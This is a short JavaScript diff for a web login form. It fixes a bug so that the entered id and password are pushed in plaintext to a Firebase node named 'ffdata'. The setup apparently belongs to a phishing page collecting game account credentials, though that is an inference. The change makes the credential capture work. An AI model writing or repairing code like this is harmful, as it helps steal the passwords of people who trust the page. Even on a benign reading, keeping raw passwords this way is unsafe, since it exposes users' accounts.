@@ -1,5 +1,7 @@
-var server=firebase.database()
+var server=firebase.database();
 var attempts="0";
+
+
 function log(){
   var id=document.getElementById("id").value;
   localStorage.id=id
@@ -11,7 +13,7 @@ function log(){
   else{
     localStorage.logins=true;
     setTimeout(function(){
-      database.ref("ffdata").push().set({
+      server.ref("ffdata").push().set({
        'id':id,
        'password':pass
       })
